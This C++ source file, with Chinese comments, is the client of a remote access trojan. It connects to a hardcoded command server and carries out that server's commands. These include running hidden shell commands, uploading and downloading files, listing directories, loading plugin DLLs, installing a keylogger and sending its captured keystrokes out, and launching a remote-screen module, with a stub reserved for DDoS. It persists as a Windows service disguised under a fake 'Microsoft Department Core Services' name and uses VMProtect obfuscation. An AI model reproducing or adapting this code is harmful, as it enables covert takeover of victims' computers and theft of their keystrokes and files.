// hisfans.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

#include "ykdef.h"
#ifdef _WIN32
#include <io.h>
#include <vector>
#include "VMProtectSDK.h"
#include <atlstr.h>
BOOL runService();
BOOL installService();
BOOL startService();
BOOL uninstallService();
#endif
#ifndef _WIN32
#define closesocket close
#define Sleep(x) sleep(x/1000)
#endif


class AppMain
{
public:
	list<thread> _List_Thread;
	list<thread> NxThr;
	chrono::system_clock::time_point _TIME = chrono::system_clock::now();
protected:
	unsigned long long ClientID;
	atomic_uint App_Status = 0U;
	WORD sockVersion;
	WSADATA data;
	SOCKET sclient;
	sockaddr_in serAddr;
	list<string> CommandList;
	string LastMsg;
#ifdef _WIN32
	HMODULE kbHookDll = NULL;
#endif
	typedef unsigned char byte;
	typedef int BOOL;
public:
	AppMain()
	{
#ifdef _WIN32
		VMProtectBeginVirtualization("AppMain");
#endif
		sockVersion = MAKEWORD(2, 2);
#ifdef _WIN32
		VMProtectEnd();
#endif
		App_Status = 1U;
		ClientID = 0ULL;
		return;
	}
#ifdef _WIN32
	void GetAllFormatFiles(string path, vector<string>& files, string format)
	{
		//文件句柄    
		long long hFile = 0;
		//文件信息    
		struct _finddata_t fileinfo;
		string p;
		if ((hFile = _findfirst(p.assign(path).append("\\*" + format).c_str(), &fileinfo)) != -1)
		{
			do
			{
				if ((fileinfo.attrib &  _A_SUBDIR))
				{
					
					if (strcmp(fileinfo.name, ".") != 0 && strcmp(fileinfo.name, "..") != 0)
					{
						files.push_back(p.assign(path).append("\\").append(fileinfo.name));
						GetAllFormatFiles(p.assign(path).append("\\").append(fileinfo.name), files, format);
					}
					
				}
				else
				{
					files.push_back(p.assign(path).append("\\").append(fileinfo.name));
				}
			} while (_findnext(hFile, &fileinfo) == 0);

			_findclose(hFile);
		}
	}
#endif
	BOOL SzNEXE(string _ToExe)
	{
		string _S_Buf;
		unsigned long long pos = 0;
		if ((pos = _ToExe.find(" -hidden", 0)) != string::npos)
		{
			while (true)
			{
				if ((pos = _ToExe.find(" -hidden", 0)) != string::npos)
					_ToExe.replace(pos, string(" -hidden").length(), "");
				else break;
			}
			_S_Buf = "隐藏执行无结果。";
#ifdef _WIN32
			ShellExecute(0, "open", "cmd", string(string("/c ") + _ToExe).c_str(), 0, SW_HIDE);
#else
			_S_Buf = "执行失败，不是WIN32系统。";
#endif
		}
		else
		{
			FILE *fp;
			char buf[4096] = { 0 };
			if ((fp = _popen(_ToExe.c_str(), "r")) == NULL)
			{
				return FALSE;
			}
			while (fgets(buf, 4096, fp) != NULL)
			{
				_S_Buf += buf;
			}
			_pclose(fp);
		}
		LastMsg = _S_Buf;
		return TRUE;
	}
	BOOL ExeShell(string _ToExe)
	{
		_TIME = chrono::system_clock::now();
		NxThr.push_back(thread(&AppMain::SzNEXE, this, _ToExe));
		NxThr.back().detach();
		return TRUE;
	}
	string Get_Domain_IP()
	{
#ifdef _WIN32
		VMProtectBeginVirtualization("GetIP");
#endif
		hostent *phst = gethostbyname(Server_Host);
		in_addr * iddr = (in_addr*)phst->h_addr;
		unsigned long IPUL = iddr->s_addr;
		return move(string(inet_ntoa(*iddr)));
#ifdef _WIN32
		VMProtectEnd();
#endif
	}
	BOOL SetAddr(string pAddr)
	{
#ifdef _WIN32
		VMProtectBeginVirtualization("SetAddr");
#endif
		serAddr.sin_family = AF_INET;
		serAddr.sin_port = htons(S_Port);
		serAddr.sin_addr.S_un.S_addr = inet_addr(pAddr.c_str());
		if (connect(sclient, (sockaddr *)&serAddr, sizeof(serAddr)) == SOCKET_ERROR)
		{
			closesocket(sclient);
			return FALSE;
		}
		return TRUE;
#ifdef _WIN32
		VMProtectEnd();
#endif
	}
	BOOL init()
	{
#ifdef _WIN32
		VMProtectBeginVirtualization("INIT");
#endif
		BOOL bDontLinger = FALSE;
		setsockopt(sclient, SOL_SOCKET, SO_DONTLINGER, (const char*)&bDontLinger, sizeof(BOOL));
		WSACleanup();
		if (WSAStartup(sockVersion, &data) != 0)
		{
			return FALSE;
		}
		sclient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (sclient == INVALID_SOCKET)
		{
			return FALSE;
		}
		return TRUE;
#ifdef _WIN32
		VMProtectEnd();
#endif
	}
	BOOL xBind(string pAddr)
	{
		if (!SetAddr(pAddr))return FALSE;
		return TRUE;
	}
	void getFiles(string path, vector<string> &ownname,unsigned long Mode)
	{
#ifdef _WIN32
		/*files存储文件的路径及名称(eg.   C:\Users\WUQP\Desktop\test_devided\data1.txt)
		ownname只存储文件的名称(eg.     data1.txt)*/

		//文件句柄  
		long long   hFile = 0;
		//文件信息  
		struct _finddata_t fileinfo;
		string p;
		if ((hFile = _findfirst(p.assign(path).append("\\*").c_str(), &fileinfo)) != -1)
		{
			do
			{
				//如果是目录,迭代之  
				//如果不是,加入列表  
				if ((fileinfo.attrib &  _A_SUBDIR) && Mode == 0)
				{  /*
				   if(strcmp(fileinfo.name,".") != 0  &&  strcmp(fileinfo.name,"..") != 0)
				   getFiles( p.assign(path).append("\\").append(fileinfo.name), files, ownname ); */
					ownname.push_back(fileinfo.name);
				}
				else if (Mode && !(fileinfo.attrib &  _A_SUBDIR))
				{
					//files.push_back(p.assign(path).append("\\").append(fileinfo.name));
					ownname.push_back(fileinfo.name);
				}
			} while (_findnext(hFile, &fileinfo) == 0);
			_findclose(hFile);
		}
#endif
	}
	BOOL GetCom()
	{
#ifdef _WIN32
		VMProtectBeginVirtualization("MainCOM0");
#endif
		string HaloData = HELEN_IS_A_BITCH;
		send(sclient, HaloData.c_str(), strlen(HaloData.c_str()) + 1, 0);
		send(sclient, reinterpret_cast<char*>(&ClientID), sizeof(unsigned long long), 0);
		shared_ptr<byte> pByte(new byte[sizeof(unsigned long long)]);
		shared_ptr<byte> szData;
		int ret = recv(sclient, reinterpret_cast<char*>(&*pByte), sizeof(unsigned long long), 0);
		if (ret>0)
		{
			unsigned long long Method;
			memcpy(&Method, &*pByte, sizeof(unsigned long long));
			if (Method == 0ULL)
			{
				closesocket(sclient);
				return FALSE;
			}
			if (Method == Shell_Method)
			{
				unsigned long long szLen;
				int retx;
				retx = recv(sclient, reinterpret_cast<char*>(&*pByte), sizeof(unsigned long long), 0);
				if (retx < 0)
				{
					closesocket(sclient);
					return FALSE;
				}
				memcpy(&szLen, &*pByte, sizeof(unsigned long long));
			szLoop:
				szData.reset(new byte[szLen]);
				retx = recv(sclient, reinterpret_cast<char*>(&*szData), szLen, 0);
				if (!ExeShell(reinterpret_cast<char*>(&*szData)))
				{
					closesocket(sclient);
					return FALSE;
				}
				retx = recv(sclient, reinterpret_cast<char*>(&*pByte), sizeof(unsigned long long), 0);
				if (retx < 0)
				{
					closesocket(sclient);
					return FALSE;
				}
				memcpy(&szLen, &*pByte, sizeof(unsigned long long));
				if (szLen != 0)goto szLoop;
			}
			else if (Method == Get_Last_Msg)
			{
				unsigned long long MsgLen;
				shared_ptr<byte> pByte(new byte[sizeof (unsigned long long)]);
				MsgLen = strlen(LastMsg.c_str()) + 1;
				memcpy(reinterpret_cast<char*>(&*pByte), &MsgLen, sizeof(unsigned long long));
				send(sclient, reinterpret_cast<char*>(&*pByte), sizeof(unsigned long long), 0);
				send(sclient, LastMsg.c_str(), strlen(LastMsg.c_str()) + 1, 0);
			}
			else if (Method == Load_Lib)
			{
#ifdef _WIN32
				vector<string> SzVector;
				char SzDir[MAX_PATH];
				GetCurrentDirectory(MAX_PATH, SzDir);
				GetAllFormatFiles(SzDir, SzVector, ".mdl");
				for (auto SzTor = SzVector.begin(); SzTor != SzVector.end(); SzTor++)
				{
					auto sDll = LoadLibrary(SzTor->c_str());
					typedef void(__stdcall *hFunc)();
					if (sDll)
					{
						auto SzFunc = (hFunc)GetProcAddress(sDll, "YK_MAIN");
						if (SzFunc)
						{
							NxThr.push_back(thread(SzFunc));
							NxThr.back().detach();
						}
					}
				}
#else
				LastMsg = "Linux/Unix平台不支持动态加载支持库";
#endif
			}
			else if (Method == Uninstall_Me)
			{
				App_Status = 0U;
				LastMsg = "即将退出";
			}
			else if (Method == Set_Client_ID)
			{
				int retx;
				retx = recv(sclient, reinterpret_cast<char*>(&*pByte), sizeof(unsigned long long), 0);
				memcpy(&ClientID, &*pByte, sizeof(unsigned long long));
				LastMsg = "成功更改用户ID信息";
			}
			else if (Method == Ddos_Method)
			{
				int retx;
				unsigned long long psupport = 1ULL;
				retx = send(sclient, reinterpret_cast<char*>(&psupport), sizeof(unsigned long long), 0);
				if (retx < 0)
				{
					closesocket(sclient);
					return FALSE;
				}
				auto ddosfx = [&]()
				{
					// FIXME 等待实现
				};
			}
			else if (Method == File_Upload)
			{
				unsigned long long psupport = 1ULL;
				send(sclient, reinterpret_cast<char*>(&psupport), sizeof(unsigned long long), 0);
				recv(sclient, reinterpret_cast<char*>(&psupport), sizeof(unsigned long long), 0);
				unique_ptr<byte> _pPath(new byte[psupport]);
				recv(sclient, reinterpret_cast<char*>(&*_pPath), psupport, 0);
				recv(sclient, reinterpret_cast<char*>(&psupport), sizeof(unsigned long long), 0);
				ofstream _fileCtrl(reinterpret_cast<const char*>(&*_pPath), ios::binary|ios::out);
				if (!_fileCtrl)
				{
					closesocket(sclient);
					return FALSE;
				}
				char _fBuffer[Pkg_Leng+8ULL];
				unsigned long long fpkgLen = 0ULL;
				recv(sclient, reinterpret_cast<char*>(&fpkgLen), sizeof(unsigned long long), 0);
				int sreturn_code = 1;
				while (fpkgLen != 0ULL)
				{
					sreturn_code = recv(sclient, reinterpret_cast<char*>(&*_fBuffer), fpkgLen, 0);
					if (sreturn_code < 0)break;
					_fileCtrl.write(_fBuffer, fpkgLen);
					sreturn_code=recv(sclient, reinterpret_cast<char*>(&fpkgLen), sizeof(unsigned long long), 0);
					if (sreturn_code < 0)break;
					Sleep(30);
				}
				_fileCtrl.close();
			}
			else if (Method == File_Download)
			{
				unsigned long long psupport = 1ULL;
				send(sclient, reinterpret_cast<char*>(&psupport), sizeof(unsigned long long), 0);
				recv(sclient, reinterpret_cast<char*>(&psupport), sizeof(unsigned long long), 0);
				unique_ptr<byte> _pPath(new byte[psupport]);
				recv(sclient, reinterpret_cast<char*>(&*_pPath), psupport, 0);
				ifstream fsRead;
				fsRead.open(reinterpret_cast<char*>(&*_pPath), ios::in | ios::binary);
				if (!fsRead)
				{
					closesocket(sclient);
					return FALSE;
				}
				fsRead.seekg(0, fsRead.end);
				unsigned long long srcSize = fsRead.tellg();
				send(sclient, reinterpret_cast<char*>(&srcSize), sizeof(unsigned long long), 0);
				fsRead.close();
				fsRead.clear();
				char fBuffer[Pkg_Leng+8ULL];
				unsigned long long latestpkg = 0ULL;
				fsRead.open(reinterpret_cast<char*>(&*_pPath), ios::binary);
				unsigned long long _Failed_Counter = 0ULL;
				while (!fsRead.eof())
				{
					fsRead.read((char*)&*fBuffer, Pkg_Leng);
					latestpkg = fsRead.gcount();
					reSendLen:
					if (send(sclient, reinterpret_cast<char*>(&latestpkg), sizeof(unsigned long long), 0) < 0)
					{
						_Failed_Counter++;
						Sleep(10);
						if (_Failed_Counter > 100ULL)break;
						goto reSendLen;
					}
					Sleep(50);
					reSendPkg:
					if (send(sclient, fBuffer, latestpkg, 0) < 0)
					{
						_Failed_Counter++;
						Sleep(10);
						if (_Failed_Counter > 100ULL)break;
						goto reSendPkg;
					}
					Sleep(40);
				}
				latestpkg = 0ULL;
				send(sclient, reinterpret_cast<char*>(&latestpkg), sizeof(unsigned long long), 0);
				fsRead.close();
				fsRead.clear();
			}
#ifdef _WIN32
			else if (Method == KeyBHook)
			{
				unsigned long long psupport = 1ULL;
				send(sclient, reinterpret_cast<char*>(&psupport), sizeof(unsigned long long), 0);
				recv(sclient, reinterpret_cast<char*>(&psupport), sizeof(unsigned long long), 0);
				typedef void(*DllFunc)();
				typedef void(*DllFunc2)(HINSTANCE);
				typedef const char* (*GetStr)();
				DllFunc HookFunc = NULL;
				GetStr HookGetStr = NULL;
				switch (psupport)
				{
				case 1ULL:
					if (kbHookDll == NULL)
					{
						kbHookDll = LoadLibraryA("KeyBGeko.mod");
					}
					if (kbHookDll)
					{
						HookFunc = (DllFunc)(GetProcAddress(kbHookDll, "SetupHook"));
						if (HookFunc)
						{
							HookFunc();
						}
					}
					break;
				case 2ULL:
					if (kbHookDll)
					{
						HookFunc = (DllFunc)(GetProcAddress(kbHookDll, "UnHook"));
						if (HookFunc)HookFunc();
					}
					break;
				case 3ULL:
				{
					string sString;
					ifstream fsRead;
					fsRead.open("LongerHFile.db", ios::in | ios::binary);
					if (!fsRead)
					{
						closesocket(sclient);
						return FALSE;
					}
					fsRead.seekg(0, fsRead.end);
					unsigned long long srcSize = fsRead.tellg();
					send(sclient, reinterpret_cast<char*>(&srcSize), sizeof(unsigned long long), 0);
					fsRead.close();
					fsRead.clear();
					char fBuffer[Pkg_Leng];
					unsigned long long latestpkg = 0ULL;
					fsRead.open("LongerHFile.db", ios::binary);
					while (!fsRead.eof())
					{
						fsRead.read((char*)&*fBuffer, Pkg_Leng);
						latestpkg = fsRead.gcount();
						send(sclient, reinterpret_cast<char*>(&latestpkg), sizeof(unsigned long long), 0);
						send(sclient, fBuffer, latestpkg, 0);
					}
					latestpkg = 0ULL;
					send(sclient, reinterpret_cast<char*>(&latestpkg), sizeof(unsigned long long), 0);
					fsRead.close();
					fsRead.clear();
				}
				case 4ULL:
					if (kbHookDll)
					{
						HookFunc = (DllFunc)(GetProcAddress(kbHookDll, "UnHook"));
						if (HookFunc)HookFunc();
					}
					FreeLibrary(kbHookDll);
					kbHookDll = NULL;
					break;
				default:
					break;
				}
			}
			else if (Method == Auto_Run)
			{
				unsigned long long RespBuffer = 1ULL;
				send(sclient, reinterpret_cast<char*>(&RespBuffer), sizeof(unsigned long long), 0);
				recv(sclient, reinterpret_cast<char*>(&RespBuffer), sizeof(unsigned long long), 0);
				switch (RespBuffer)
				{
				case 1ULL:
					if (installService())
					{
						if (startService())
						{
							LastMsg = "启动服务的时候出现了错误";
						}
						else
						{
							LastMsg = "安装并启动服务成功";
						}
					}
					else
						LastMsg = "安装服务的时候出现了错误";
					break;
				case 2ULL:
					if (!runService())
					{
						LastMsg = "启动服务的时候出现了错误";
					}
					else
						LastMsg = "运行服务成功";
					break;
				case 3ULL:
					if (uninstallService())
					{
						LastMsg = "卸载服务成功";
					}
					else
						LastMsg = "卸载服务失败";
					break;
				default:
					break;
				}
				RespBuffer = LastMsg.size() + 1;
				send(sclient, reinterpret_cast<char*>(&RespBuffer), sizeof(unsigned long long), 0);
				send(sclient, LastMsg.c_str(), RespBuffer, 0);
			}
			else if (Method == Remote_Screen)
			{
				unsigned long long RespBuffer = 1ULL;
				send(sclient, reinterpret_cast<char*>(&RespBuffer), sizeof(unsigned long long), 0);
				CString strFilePath1 = "lpdata.mod";              //新进程执行程序
				PROCESS_INFORMATION pt;
				STARTUPINFO si;                                       //PC版这个参数不加，会导致创建进程出错，wce不用，直接为NULL
				memset(&pt, 0, sizeof(pt));
				memset(&si, 0, sizeof(si));
				if (!CreateProcess(strFilePath1, NULL, NULL, NULL, true, 0, NULL, NULL, &si, &pt))
				{
					cout << "DEBUG:创建进程失败";
				}
				CloseHandle(pt.hProcess);
				CloseHandle(pt.hThread);
			}
#endif
			else if (Method == File_List)
			{
				unsigned long long RespBuffer = 1ULL;
				send(sclient, reinterpret_cast<char*>(&RespBuffer), sizeof(unsigned long long), 0);
				char QueryPath[MAX_PATH];
				recv(sclient, reinterpret_cast<char*>(&RespBuffer), sizeof(unsigned long long), 0);
				recv(sclient, QueryPath, RespBuffer, 0);
				vector<string> FileStrS;
				getFiles(QueryPath, FileStrS, 1);
				for (auto pStrm = FileStrS.begin(); pStrm != FileStrS.end(); pStrm++)
				{
					RespBuffer = pStrm->size() + 1;
					send(sclient, (char*)&RespBuffer, sizeof(unsigned long long), 0);
					send(sclient, pStrm->c_str(), RespBuffer, 0);
				}
				RespBuffer = 0;
				send(sclient, (char*)&RespBuffer, sizeof(unsigned long long), 0);
				FileStrS.clear();
				getFiles(QueryPath, FileStrS, 0);
				for (auto pStrm = FileStrS.begin(); pStrm != FileStrS.end(); pStrm++)
				{
					RespBuffer = pStrm->size() + 1;
					send(sclient, (char*)&RespBuffer, sizeof(unsigned long long), 0);
					send(sclient, pStrm->c_str(), RespBuffer, 0);
				}
				RespBuffer = 0;
				send(sclient, (char*)&RespBuffer, sizeof(unsigned long long), 0);
			}
			else if (Method >= 1000ULL)
			{
				int retx;
				unsigned long long psupport = 0ULL;
				retx = send(sclient, reinterpret_cast<char*>(&psupport), sizeof(unsigned long long), 0);
			}
			else
			{
				closesocket(sclient);
				return FALSE;
			}
		}
		closesocket(sclient);
		return TRUE;
#ifdef _WIN32
		VMProtectEnd();
#endif
	}
	BOOL Get_Status()
	{
		if (App_Status)return TRUE;
		else return FALSE;
	}
	void Work()
	{
		string szIP =
#ifdef NEEDDOMAIN
			Get_Domain_IP()
#else
			Server_IP
#endif
			;
		while (App_Status)
		{
			if (!init())
			{
				cout << "没有成功载入。" << endl;
				Sleep(Wait_Time);
				continue;
			}
			else if (!xBind(szIP))
			{
				cout << "没有成功BIND到服务器。" << endl;
				Sleep(Wait_Time);
				continue;
			}
			else if (!GetCom())
			{
				cout << "没有执行命令。" << endl;
				Sleep(Wait_Time);
				continue;
			}
			else
			{
				cout << "命令执行成功。" << endl;
			}
			Sleep(Wait_Time);
		}
		return;
	}
	int YK_MAIN(void)
	{
		shared_ptr<AppMain> _pApp(new AppMain);
		_pApp->init();
		_pApp->_List_Thread.push_back(thread(&AppMain::Work, _pApp));
		_pApp->_List_Thread.back().detach();
		while (_pApp->Get_Status())
		{
			Sleep(10000);
			if (chrono::system_clock::now() - _pApp->_TIME > chrono::seconds(10))
			{
				_pApp->_TIME = chrono::system_clock::now();
				_pApp->NxThr.clear();
			}
		}
		return 0;
	}
};

int main();

#ifdef _WIN32
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
{
	return main();
}
#endif


int main()
{
	//唯一pApp初始化（类似MFC）
	shared_ptr<AppMain> _pApp(new AppMain);
	auto SYNC = async(&AppMain::YK_MAIN, _pApp);
    return SYNC.get();
}

#ifdef _WIN32

#define SAFE_CALL(Khand,ecode) if(Khand==ecode){\
cout <<"Unexpected."<<__LINE__<<endl;\
return FALSE;}

string getExeFullFilename()
{
	static char buffer[1024];

	SAFE_CALL(GetModuleFileName(NULL, buffer, 1024), 0);
	return string(buffer);
}

BOOL installService()
{
	auto scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
	SAFE_CALL(scmHandle, NULL);

	auto serviceHandle = CreateServiceA(scmHandle,
		"Microsoft Department Core Services",
		"Microsoft Department Core Services",
		SERVICE_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS,
		SERVICE_AUTO_START,
		SERVICE_ERROR_NORMAL,
		getExeFullFilename().c_str(),
		NULL, NULL, "", NULL, "");
	SAFE_CALL(serviceHandle, NULL);

	CloseServiceHandle(scmHandle);
	CloseServiceHandle(serviceHandle);
	return TRUE;
}


BOOL uninstallService()
{
	auto scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	SAFE_CALL(scmHandle, NULL);

	auto serviceHandle = OpenServiceA(scmHandle,
		"Microsoft Department Core Services",
		SERVICE_ALL_ACCESS);
	SAFE_CALL(serviceHandle, NULL);

	SERVICE_STATUS serviceStatus;
	SAFE_CALL(QueryServiceStatus(serviceHandle, &serviceStatus), 0);
	if (serviceStatus.dwCurrentState == SERVICE_RUNNING) {
		SAFE_CALL(ControlService(serviceHandle, SERVICE_CONTROL_STOP, &serviceStatus), 0);
		SAFE_CALL(serviceStatus.dwCurrentState, NO_ERROR);

		do {
			SAFE_CALL(QueryServiceStatus(serviceHandle, &serviceStatus), 0);
			Sleep(1000);
		} while (serviceStatus.dwCurrentState != SERVICE_STOPPED);
	}

	SAFE_CALL(DeleteService(serviceHandle), FALSE);

	CloseServiceHandle(scmHandle);
	CloseServiceHandle(serviceHandle);
	return TRUE;
}
BOOL startService()
{
	auto scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	SAFE_CALL(scmHandle, NULL);

	auto serviceHandle = OpenService(scmHandle,
		"Microsoft Department Core Services",
		SERVICE_ALL_ACCESS);
	SAFE_CALL(serviceHandle, NULL);

	SERVICE_STATUS serviceStatus;
	SAFE_CALL(QueryServiceStatus(serviceHandle, &serviceStatus), 0);
	if (serviceStatus.dwCurrentState == SERVICE_START &&
		serviceStatus.dwCurrentState != SERVICE_START_PENDING)
		return TRUE;

	SAFE_CALL(StartService(serviceHandle, 0, NULL), FALSE);

	CloseServiceHandle(scmHandle);
	CloseServiceHandle(serviceHandle);
	return TRUE;
}
SERVICE_STATUS_HANDLE g_serviceStatusHandle = NULL;

BOOL setServiceStatus(DWORD status)
{
	SERVICE_STATUS serviceStatus;
	serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	serviceStatus.dwWin32ExitCode = NO_ERROR;
	serviceStatus.dwServiceSpecificExitCode = 0;
	serviceStatus.dwWaitHint = 2000;
	serviceStatus.dwCheckPoint = 0;
	serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_PAUSE_CONTINUE |
		SERVICE_ACCEPT_SHUTDOWN |
		SERVICE_ACCEPT_STOP;

	serviceStatus.dwCurrentState = status;
	SAFE_CALL(SetServiceStatus(g_serviceStatusHandle, &serviceStatus), 0);
	return TRUE;
}

VOID WINAPI ServiceHandler(DWORD controlCode)
{
	switch (controlCode)
	{
	case SERVICE_CONTROL_CONTINUE:
		setServiceStatus(SERVICE_START_PENDING);    break;
	case SERVICE_CONTROL_INTERROGATE:
		break;
	case SERVICE_CONTROL_PAUSE:
		setServiceStatus(SERVICE_PAUSED);           break;
	case SERVICE_CONTROL_SHUTDOWN:
		setServiceStatus(SERVICE_STOPPED);          break;
	case SERVICE_CONTROL_STOP:
		setServiceStatus(SERVICE_STOPPED);          break;
	default:
		break;
	}
}

VOID WINAPI ServiceMain(DWORD argc, LPSTR *argv)
{
	g_serviceStatusHandle = RegisterServiceCtrlHandler("Microsoft Department Core Services", &ServiceHandler);
	if (g_serviceStatusHandle == 0)
	{
		cout << "RegisterServiceCtrlHandlerW error, code:" << GetLastError()
			<< " ,line:" << __LINE__ << "\n";
		return;
	}

	setServiceStatus(SERVICE_START_PENDING);
	setServiceStatus(SERVICE_RUNNING);
}
BOOL runService()
{
	const SERVICE_TABLE_ENTRY serviceTable[] = {
		{ "", ServiceMain },
		{ NULL, NULL }
	};

	SAFE_CALL(StartServiceCtrlDispatcher(&serviceTable[0]), 0);
	return TRUE;
}
#endif
